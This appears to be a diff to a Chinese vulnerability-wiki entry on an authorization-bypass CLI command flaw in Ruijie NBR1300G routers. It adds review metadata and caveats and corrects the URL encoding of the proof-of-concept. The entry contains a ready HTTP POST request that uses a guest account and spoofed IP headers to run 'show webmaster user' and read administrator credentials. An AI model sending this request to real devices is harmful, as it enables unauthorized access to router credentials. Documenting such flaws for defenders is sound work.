@@ -1,9 +1,56 @@
 ---
 version: "锐捷 NBR 路由器"
 source: "Threekiii/Vulnerability-Wiki"
+id: "vw-85a0183bd4da903c0b7eeee8"
+entity_id: "ve-85a0183bd4da903c0b7eeee8"
+schema_version: "1"
+title: "锐捷 NBR 1300G 路由器 越权 CLI 命令执行漏洞"
+product: "Ruijie NBR1300G"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+identifier_role: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+prerequisites: "guest/guest有效账户；固件未知"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7-NBR-1300G%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%B6%8A%E6%9D%83CLI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
+review_date: "2026-10-02"
+side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露"
+source_status: "unknown"
 ---
 
 # 锐捷 NBR 1300G 路由器 越权 CLI 命令执行漏洞
+
+<!-- article-review:devices:begin -->
+## 技术校订与证据边界（2026-10-02）
+
+- 产品/组件：Ruijie NBR1300G
+- 本文讨论：guest越权LEVEL15设备CLI读取管理员凭据
+- 版本、权限与配置前提：guest/guest有效账户；固件未知
+- 资料类型：越权PoC/检测模板；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果
+
+### 逐项校订
+
+- 原始请求show%webmaster%user百分号非有效空格编码，模板用真实空格，两者不一致
+- 原始请求带4个伪造IP头，xpoc未带，是否必要未解释
+- CLI是设备配置命令，不等同底层OS任意代码执行；模板只匹配guest行未证明管理员密码读取
+- 影响写整个NBR系列过宽
+- 已落实的文本修订：“show%webmaster%user”改为“show%20webmaster%20user”；HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
+
+### 操作风险与恢复
+
+- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露
+
+### 待核与来源
+
+- xray原模板、固件及IP头必要性待核
+- 引用图片未查看，截图内容及有效性待核验
+- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
+- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
+<!-- article-review:devices:end -->
+
 
 ## 漏洞描述
 
@@ -34,7 +81,7 @@ title="锐捷网络 --NBR路由器--登录界面"
 
 执行 CLI 命令 `show webmaster user` 查看用户配置账号密码：
 
-```plain
+```http
 POST /WEB_VMS/LEVEL15/ HTTP/1.1
 Host: 
 Connection: keep-alive
@@ -51,7 +98,7 @@ x-originating-ip: 127.0.0.1
 x-remote-ip: 127.0.0.1
 x-remote-addr: 127.0.0.1
 
-command=show%webmaster%user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
+command=show%20webmaster%20user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
 ```
 
 ![](./.resource/锐捷-NBR-1300G路由器-越权CLI命令执行漏洞/media/file-20240904112924288.png)
